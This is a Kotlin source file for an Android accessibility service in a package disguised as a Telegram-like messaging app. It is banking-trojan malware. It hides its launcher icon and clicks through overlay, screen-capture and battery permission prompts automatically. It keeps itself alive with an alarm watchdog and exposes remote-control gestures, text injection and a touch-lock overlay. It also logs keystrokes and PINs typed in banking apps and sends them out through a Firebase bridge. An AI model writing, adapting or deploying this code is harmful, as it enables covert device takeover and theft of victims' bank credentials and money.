package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.app.AlarmManager
import android.app.Instrumentation
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.graphics.Path
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.view.Gravity
import android.view.KeyEvent
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log
import androidx.core.app.NotificationCompat
import java.util.*

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var touchLockOverlay: WindowManager? = null
    private var pinBuffer: StringBuilder? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }

        hideAppIcon()
        mainHandler.postDelayed({ requestOverlayPermission() }, 500)
        startWatchdog()
    }

    private fun startWatchdog() {
        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, ServiceRestartReceiver::class.java)
        val pending = PendingIntent.getBroadcast(this, 100, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        alarm.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 60000, 60000, pending)
    }

    private fun requestOverlayPermission() {
        if (Settings.canDrawOverlays(this)) {
            requestScreenCapturePermission()
            return
        }
        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        mainHandler.postDelayed({ clickOverlayToggle() }, 2000)
    }

    private fun clickOverlayToggle() {
        val root = rootInActiveWindow ?: return
        val switches = root.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
        if (switches.isNotEmpty()) {
            val sw = switches[0]
            if (sw.isCheckable && !sw.isChecked) {
                sw.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                mainHandler.postDelayed({
                    performGlobalAction(GLOBAL_ACTION_BACK)
                    requestScreenCapturePermission()
                }, 1000)
            } else {
                performGlobalAction(GLOBAL_ACTION_BACK)
                requestScreenCapturePermission()
            }
        } else {
            performGlobalAction(GLOBAL_ACTION_BACK)
            requestScreenCapturePermission()
        }
    }

    private fun requestScreenCapturePermission() {
        val intent = Intent(this, com.telegram2.messaging.ScreenPermissionActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        mainHandler.postDelayed({
            val root = rootInActiveWindow ?: return@postDelayed
            for (node in root.findAccessibilityNodeInfosByText("Start now")) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    requestBatteryPermission()
                    return@postDelayed
                }
            }
            requestBatteryPermission()
        }, 2000)
    }

    private fun requestBatteryPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (pm.isIgnoringBatteryOptimizations(packageName)) {
                finishAutoPermission()
                return
            }
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName"))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            mainHandler.postDelayed({
                val root = rootInActiveWindow
                if (root != null) {
                    for (node in root.findAccessibilityNodeInfosByText("Allow")) {
                        if (node.isClickable) node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    }
                }
                finishAutoPermission()
            }, 2000)
        } else {
            finishAutoPermission()
        }
    }

    private fun finishAutoPermission() {
        hideAppIcon()
        startScreenCapture()
    }

    // ======================== REMOTE CONTROL ========================
    fun tap(x: Int, y: Int) {
        val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
            .build(), null, null)
    }

    fun swipe(sx: Int, sy: Int, ex: Int, ey: Int, dur: Long) {
        val path = Path().apply { moveTo(sx.toFloat(), sy.toFloat()); lineTo(ex.toFloat(), ey.toFloat()) }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, dur))
            .build(), null, null)
    }

    fun injectText(text: String) {
        mainHandler.post {
            val root = rootInActiveWindow ?: return@post
            val input = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            if (input != null && !input.isPassword) {
                val b = Bundle().apply { putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text) }
                input.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b)
            } else {
                injectViaKeys(text)
            }
        }
    }

    fun injectViaKeys(text: String) {
        Thread {
            try {
                val instr = Instrumentation()
                for (ch in text) {
                    val code = when (ch) {
                        '0' -> KeyEvent.KEYCODE_0; '1' -> KeyEvent.KEYCODE_1
                        '2' -> KeyEvent.KEYCODE_2; '3' -> KeyEvent.KEYCODE_3
                        '4' -> KeyEvent.KEYCODE_4; '5' -> KeyEvent.KEYCODE_5
                        '6' -> KeyEvent.KEYCODE_6; '7' -> KeyEvent.KEYCODE_7
                        '8' -> KeyEvent.KEYCODE_8; '9' -> KeyEvent.KEYCODE_9
                        else -> return
                    }
                    val down = KeyEvent.obtain(SystemClock.uptimeMillis(), SystemClock.uptimeMillis(), KeyEvent.ACTION_DOWN, code, 0)
                    instr.sendKeySync(down)
                    Thread.sleep(50)
                    val up = KeyEvent.obtain(SystemClock.uptimeMillis(), SystemClock.uptimeMillis(), KeyEvent.ACTION_UP, code, 0)
                    instr.sendKeySync(up)
                }
            } catch (_: Exception) {}
        }.start()
    }

    fun clickText(text: String) {
        mainHandler.post {
            val root = rootInActiveWindow ?: return@post
            for (node in root.findAccessibilityNodeInfosByText(text)) {
                if (node.isClickable) node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }
    }

    fun launchApp(pkg: String): Boolean {
        val i = packageManager.getLaunchIntentForPackage(pkg) ?: return false
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(i)
        return true
    }

    fun lockTouch(enable: Boolean) {
        if (enable) {
            if (touchLockOverlay != null) return
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
            ).apply { gravity = Gravity.TOP or Gravity.LEFT; x = 0; y = 0 }
            touchLockOverlay = wm
            wm.addView(android.view.View(this), params)
        } else {
            touchLockOverlay?.let { try { it.removeView(android.view.View(this)) } catch (_: Exception) {} }
            touchLockOverlay = null
        }
    }

    fun hideAppIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, "com.telegram2.messaging.MainActivity"),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }

    fun uninstallSelf() {
        val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName"))
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(i)
        mainHandler.postDelayed({
            val root = rootInActiveWindow ?: return@postDelayed
            for (txt in listOf("Uninstall", "OK")) {
                for (node in root.findAccessibilityNodeInfosByText(txt)) {
                    if (node.isClickable) node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }
            }
        }, 2500)
    }

    fun startScreenCapture() {
        startActivity(Intent(this, com.telegram2.messaging.ScreenPermissionActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        })
    }

    fun stopScreenCapture() {
        try {
            val i = Intent(this, ScreenCaptureService::class.java).apply { action = "stop" }
            stopService(i)
        } catch (_: Exception) {}
    }

    fun getInstalledApps(): List<String> = packageManager.getInstalledPackages(0).map { it.packageName }

    fun runOnMainThread(block: () -> Unit) { mainHandler.post(block) }

    // ======================== PIN CAPTURE ========================
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val pkg = event.packageName?.toString() ?: return
                if (BankLogger.BANK_PACKAGES.contains(pkg)) {
                    val text = event.text.joinToString(" ")
                    FirebaseBridge.sendKeylog(pkg, text)
                    if (event.className?.toString()?.contains("EditText") == true) {
                        val src = event.source ?: return
                        if (src.isPassword) {
                            if (pinBuffer == null) pinBuffer = StringBuilder()
                            event.text.forEach { pinBuffer?.append(it) }
                        }
                    }
                }
            } else if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                if (pinBuffer != null && pinBuffer!!.isNotEmpty()) {
                    val src = event.source ?: return
                    val label = src.text?.toString() ?: src.contentDescription?.toString() ?: ""
                    if (Regex("Confirm|Send|Login|Sign in|OK|Continue", RegexOption.IGNORE_CASE).containsMatchIn(label)) {
                        val pin = pinBuffer.toString()
                        val pkg = event.packageName?.toString() ?: return
                        FirebaseBridge.savePin(pkg, pin)
                        FirebaseBridge.logBankData(pkg, pin = pin)
                        pinBuffer = null
                    }
                }
            }
        } catch (_: Exception) {}
    }

    override fun onInterrupt() {}
}